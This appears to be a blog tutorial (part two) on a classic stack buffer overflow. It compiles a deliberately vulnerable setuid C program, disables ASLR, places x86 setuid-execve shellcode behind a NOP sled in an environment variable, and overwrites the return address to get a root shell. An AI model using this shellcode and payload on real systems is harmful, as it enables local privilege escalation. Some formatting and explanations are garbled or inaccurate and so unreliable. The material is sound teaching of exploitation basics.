+++
title = "On Stack Smashing, Part Two"
date = "2019-04-10T15:24:27-04:00"

+++

This post is part two of a post on [stack smashing].  [Part one] should be read first.

## Chroot

I'm going to create a chroot and install a 32-bit debian OS into it.  Why?  Why not!  Weeeeeeeeeeeeeeeeeee

```bash
$ debootstrap --include=build-essential,gdb,vim \
    --arch i386 stretch /srv/chroot/32 http://ftp.debian.org/debian

$ sudo schroot -u root -c 32
```

## Injecting the Shellcode

Let's look again at our little program:

`cat_pictures.c`

```c
#include <stdio.h>
#include <string.h>

void foo(char *s) {
    char buf[10];
    strcpy(buf, s);
    printf("%s\n", buf);
}

int main(int argc, char **argv) {
    foo(argv[1]);
    return 0;
}
```

Our goal now is to exploit the `cat_pictures` binary to give us a root shell.  Unfortunately, several things must be favorable for this particular example to work:

- the binary must have root privileges and have its [`setuid`] bit set
- the binary must have been compiled with the [`-fno-stack-protector`] flag
- although not strictly necessary, it's easier to have [ASLR] turned off

As you can see this is a fairly controlled experiment, but it is still very educational and enlightening and worth studying.

### The Shellcode

I have a binary file on my machine called `shellcode.bin` that mysteriously appeared one day as I was praying to Jesus.  This magical binary file contains [machine code] that will spawn a shell:

```
\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80
```

Let's have a look at it in hex:

```bash
(32)test@trout:$ hexdump -C shellcode.bin
00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|
00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|
00000020  e1 cd 80 0a                                       |....|
00000024
```

And let's get it into an environment variable `SHELLCODE`, prepended with a generous [NOP sled]:

bash``
(32)test@trout:$ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
(32)test@trout:$ echo $SHELLCODE
111ə̀j
     XQh//shh/binQS
```

> Why did I put the shellcode into an environment variable?
>
> This was necessary because the vulnerable buffer in this contrived example is only 10 bytes in size, which is nowhere near large enough to hold the exploit (35 bytes) and a NOP sled.  If the buffer was larger, we could possibly do the exploit without putting an env var on the stack.

And now we'll compile (ensuring the stack is executable), afterwards changing back to `root` temporarily to change the owner and permissions (including setting the `setuid` bit to make the privilege escalation hack possible).

bash``
(32)test@trout:$ gcc -o cat_pictures -ggdb3 -z execstack cat_pictures.c
(32)test@trout:$ exit
(32)root@trout:# chown root cat_pictures
(32)root@trout:# chmod 4550 cat_pictures
(32)root@trout:# su test
(32)test@trout:$ ls -l cat_pictures
-r-sr-x--- 1 root test 27960 Apr 18 02:52 cat_pictures
```

Ok, the binary looks good.

Again, the exploit won't work as intended without setting the `setuid` bit, which will escalate privileges and spawn a root shell when run.  Without setting the `setuid`, we'd still spawn a shell, but it would be as the user `test`, with the same privileges as we already have.  Boring!

### Determining the Address

After having injected our payload into the `SHELLCODE` environment variable, we need to determine its memory address on the stack.  This can be done in a couple of ways.

1. Use the [`getenv`] C standard library function to get the memory of any env var.

	`getenv.c`

	```c
	#include <stdlib.h>
	#include <stdio.h>

	void main(int argc, char **argv) {
	    printf("%s -> %p\n", argv[1], getenv(argv[1]));
	}
	```

	With ASLR on, we can see how the memory address changes with every invocation:

	```bash
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffb3ed84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffaf7d84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffaaed84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffe6bd84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffdb3d84
	```
	Now, let's turn it off.  Although, not strictly necessary, it means that the memory addresses won't change, which makes the exploit easier.

	```bash
	# In a terminal outside of the chroot...
	$ echo 0 | sudo dd of=/proc/sys/kernel/randomize_va_space
	0+1 records in
	0+1 records out
	2 bytes copied, 1.8874e-05 s, 106 kB/s

	# Back in the chroot...
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffffdd84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffffdd84
	(32)test@trout:$ ./getenv SHELLCODE
	SHELLCODE -> 0xffffdd84
	```

2. We can run the binary in a `GDB` session to also determine its address:

	<pre>
	(32)test@trout:$ gdb -q cat_pictures
	Reading symbols from cat_pictures...done.
	<span style="color: green;">(gdb)</span> b main
	Breakpoint 1 at 0x615: file cat_pictures.c, line 20.
	<span style="color: green;">(gdb)</span> r
	Starting program: /home/test/cat_pictures

	Breakpoint 1, main (argc=1, argv=0xffffd614) at cat_pictures.c:20
	warning: Source file is more recent than executable.
	20          derp(argv[1]);
	<span style="color: green;">(gdb)</span> <span style="color: brown;">x/20s *((char **) environ)</span>
	0xffffd75b:     "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
	0xffffd823:     "=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=0"...
	0xffffd8eb:     "1;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.al"...
	0xffffd9b3:     "z=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;"...
	0xffffda7b:     "35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*."...
	0xffffdb43:     "m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;"...
	0xffffdc0b:     "35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka="...
	0xffffdcd3:     "00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
	0xffffdd47:     "_=/usr/bin/gdb"
	0xffffdd56:     "OLDPWD=/root"
	<span style="color: brown;">0xffffdd63:     "SHELLCODE=", '\220' &lt;repeats 190 times&gt;...</span>
	0xffffde2b:     "\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\231\260\244\315\200j\vXQh//shh/bin\211\343Q\211\342S\211\341\315\200"
	0xffffde59:     "USER=test"
	0xffffde63:     "SCHROOT_GROUP=root"
	0xffffde76:     "PWD=/home/test"
	0xffffde85:     "LINES=50"
	0xffffde8e:     "HOME=/home/test"
	0xffffde9e:     "SCHROOT_ALIAS_NAME=32"
	0xffffdeb4:     "SCHROOT_GID=0"
	0xffffdec2:     "SCHROOT_UID=0"
	<span style="color: green;">(gdb)</span> x 0xffffdd63+100
	0xffffddc7:     '\220' <repeats 110 times>, "\061\300\061\333\061\311\231\260\244\315\200j\vXQh//shh/bin\211\343Q\211\342S\211\341\315\200"
	<span style="color: green;">(gdb)</span>
	</pre>

	> What is the `environ` symbol?  That refers to the text file that stores all the environment variables for every process that is created.  You can find them in the virtual `proc` filesystem.  Every process will have a directory for the time it is running and is removed when it is closed/killed.
	>
	> For example, as `GDB` is running, I opened another terminal, got its process number, and listed it in the `proc` filesystem:
	>
	> 		$ pgrep gdb
	> 		20083
	>
	>		~:$ sudo ls /proc/20083
	>		attr       clear_refs       cpuset   fd       limits     mem         net        oom_score      personality  schedstat  smaps_rollup  status   timerslack_ns
	>		autogroup  cmdline          cwd      fdinfo   loginuid   mountinfo   ns         oom_score_adj  projid_map   sessionid  stack         syscall  uid_map
	>		auxv       comm             environ  gid_map  map_files  mounts      numa_maps  pagemap        root         setgroups  stat          task     wchan
	>		cgroup     coredump_filter  exe      io       maps       mountstats  oom_adj    patch_state    sched        smaps      statm         timers
	>
	> 		$ ll /proc/20083/environ
	> 		-r-------- 1 1001 1001 0 Apr 10 00:09 /proc/20083/environ
	>
	> In `GDB`, you can also do this in a running program:
	>
	>		(gdb) i variable environ
	>		All variables matching regular expression "environ":
	>
	>		Non-debugging symbols:
	>		0xf7faadc8  __environ
	>		0xf7faadc8  _environ
	>		0xf7faadc8  environ
	>
	> Or, to see all defined variables:
	>
	>		(gdb) i variables

	The addresses will be different when run in the `GDB` session, as you probably noticed.  Because of the `NOP` sled, this is alright.

## The Payoff

Now, let's smash the stack with our little payload.  As long as we overwrite the return address with some address on the `NOP` sled, it will slide down to the payoff, just as God intended.

Remember, Intel processors store bits in little-endian order, so the bytes must be written in reverse:

```bash
(32)test@trout:$ ./cat_pictures $(perl -e 'print "A"x22 . "\xc7\xdd\xff\xff"')

# whoami
root
# id
uid=0(root) gid=1001(test) groups=1001(test)
#
```

Whoa.

## Conclusion

Yes, the example used here is a bit contrived, but, as stated previously, the point of these posts is to demonstrate and learn how a buffer overlflow exploitation is done.  It's very important to understand this, and it teaches one about several different things, including memory management, that every programmer should at least have some familiarity.

Also, kinds of exploits happen all the time.  Just subscribe to any OS security mailing list, and you will quickly understand that this kind of exploit has not been solved, even though there have been measures taken to try and make them more difficult to successfully perform.

## References

- https://nostarch.com/hacking2.htm
- https://insecure.org/stf/smashstack.html

[Stack smashing]: https://en.wikipedia.org/wiki/Stack_buffer_overflow
[Part one]: /2019/04/09/on-stack-smashing-part-one/
[`setuid`]: https://en.wikipedia.org/wiki/Setuid
[`-fno-stack-protector`]: https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector
[ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization
[machine code]: https://en.wikipedia.org/wiki/Machine_code
[NOP sled]: https://en.wikipedia.org/wiki/NOP_slide
[`getenv`]: http://man7.org/linux/man-pages/man3/getenv.3.html

